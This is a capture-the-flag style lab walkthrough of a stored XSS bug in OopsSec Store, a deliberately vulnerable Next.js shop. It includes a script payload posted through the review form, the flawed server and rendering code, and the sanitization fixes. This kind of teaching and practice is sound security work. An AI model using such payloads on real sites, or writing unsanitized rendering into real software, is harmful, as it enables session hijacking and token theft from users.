# Stored XSS in OopsSec Store Lets a Single Review Run JavaScript on Every User

> **Author**: OopsSec Store
> **Published**: Jan 14, 2026

---

## A single malicious review quietly hijacks every shopper’s browser in OopsSec Store

![OopsSec Store](https://miro.medium.com/v2/resize:fill:32:32/1*eBaZCG-O4z2c_UnbKdKPUA.jpeg)

Listen

Share

In this lab, we’re going to exploit a stored XSS in OopsSec Store’s product reviews.
You’ll inject JavaScript into a review, have it stored in the database, and watch it execute every time the page loads.

The goal is simple: make the browser call an internal flag endpoint and prove code execution in the victim’s session.

If you want to run it on your own machine, pull the OopsSec Store repo from GitHub and start the app locally before following the steps below.

## GitHub - kOaDT/oss-oopssec-store: Run `npx create-oss-store`, open your browser, and start hunting…

### Run `npx create-oss-store`, open your browser, and start hunting flags. Deliberately vulnerable Next.js e-commerce for…

github.com

## Lab setup — Running OopsSec Store

Open a terminal and run:

```
npx create-oss-store oss-store
cd oss-store
npm run dev
```

This installs the app, creates a local database, and injects test data.
After a few seconds, the shop is available at: http://localhost:3000.

Open it in your browser.
You should see a normal-looking store with products and reviews.

That’s your attack surface.

## What we’re trying to break

Pick any product and scroll down.

You’ll see a Reviews section with:

- Existing comments from users
- A form where you can post a new one

When you submit a review:

- Your browser sends it to /api/products/[id]/reviews
- The backend stores it in the database
- The frontend renders it directly into the product page

The app assumes reviews are just text. But they’re not.

If you inject JavaScript, it will be stored and executed every time someone opens the page.

## Step-by-step exploit

You’re going to turn a review into a persistent JavaScript payload.

### 1. Open a product page

Click on any product. It doesn’t matter which one.

Scroll down to the Reviews section.

![image](https://miro.medium.com/v2/resize:fit:1000/1*z0YHCFl30boPsk-slsRudA.png)

### 2. Inject a malicious payload

In the review textarea, paste this:

```
<script>
  fetch("/api/flags/cross-site-scripting-xss")
    .then((r) => r.json())
    .then((data) => {
      if (data.flag) {
        alert("Flag: " + data.flag);
      }
    });
</script>
```

This script runs in the victim’s browser and:

- Makes an authenticated request to the API
- Pulls the flag
- Displays it in a popup

### 3. Submit the review

Click Submit. The API stores your payload in the database as a normal review. Nothing blocks it. Nothing escapes it.

### 4. Reload the page

Refresh the product page. Your review is now loaded from the database and injected into the DOM. The <script> tag is parsed.

## Get OopsSec Store’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

The JavaScript executes.

## Getting the flag

As soon as the page reloads, you should see a popup.

Inside it:

```
Flag: OSS{cr0ss_s1t3_scr1pt1ng_xss}
```

That’s your proof. Your JavaScript ran inside the page, with the user’s privileges, and accessed a protected endpoint.

Every time anyone opens this product page, the same code will execute.

![image](https://miro.medium.com/v2/resize:fit:1000/1*38oHq-plC0wTa8TRPhclxw.png)

## Why the app is vulnerable

Two bad assumptions created this bug.

The backend trusts user input:

```
const review = await prisma.review.create({
  data: {
    productId: id,
    content: content.trim(), // ❌ no sanitization
    author,
  },
});
```

The API blindly stores whatever you send.

The frontend injects it as HTML:

```
<div
  ref={(el) => {
    reviewRefs.current[review.id] = el; // ❌ raw HTML injection
  }}
  className="text-slate-700 dark:text-slate-300"
/>
```

That means <script> is not escaped. It runs.

That’s stored XSS:

- The payload is saved in the database
- It executes for every viewer
- It runs in their authenticated session

## How to fix it properly

You fix this on both sides.

### 1. Sanitize on the server

```
import DOMPurify from "isomorphic-dompurify";

const review = await prisma.review.create({
  data: {
    productId: id,
    content: DOMPurify.sanitize(content.trim()),
    author,
  },
});
```

This removes scripts before they ever reach the database.

### 2. Render safely in React

Let React escape HTML:

```
<div className="text-slate-700 dark:text-slate-300">
  {review.content}
</div>
```

## Conclusion

This kind of bug has been used to hijack sessions, steal tokens, and run phishing attacks inside real applications.
It usually starts with something boring like a comment box or a review form.

That’s why breaking apps like OopsSec Store matters. You get to see how small mistakes turn into full browser compromise.

If this lab helped you, go check the GitHub repo.

## GitHub - kOaDT/oss-oopssec-store: Run `npx create-oss-store`, open your browser, and start hunting…

### Run `npx create-oss-store`, open your browser, and start hunting flags. Deliberately vulnerable Next.js e-commerce for…

github.com

## Disclaimers

Do not deploy OopsSec Store on a production server. This application is intentionally vulnerable and should only be used in isolated, local environments for educational purposes.

Do not exploit vulnerabilities on systems you don’t have explicit authorization to test. Unauthorized access to computer systems is illegal. Always obtain proper permission before performing security testing.

AI assistance was used in the writing of this writeup.

## Feedback & Support

Having trouble following this writeup? Found a typo or have suggestions for improvement?

Feel free to open an issue or start a discussion on GitHub.

👉 If you find this project useful, consider giving it a star or forking it to show support!

![image](https://miro.medium.com/v2/resize:fit:700/1*6iFapErrp7IUDmz4P-gTEw.png)



---
*Original URL: [https://medium.com/@oopssec-store/stored-xss-in-oopssec-store-lets-a-single-review-run-javascript-on-every-user-e964222dc43d?source=search_post---------88-----------------------------------](https://medium.com/@oopssec-store/stored-xss-in-oopssec-store-lets-a-single-review-run-javascript-on-every-user-e964222dc43d?source=search_post---------88-----------------------------------)*
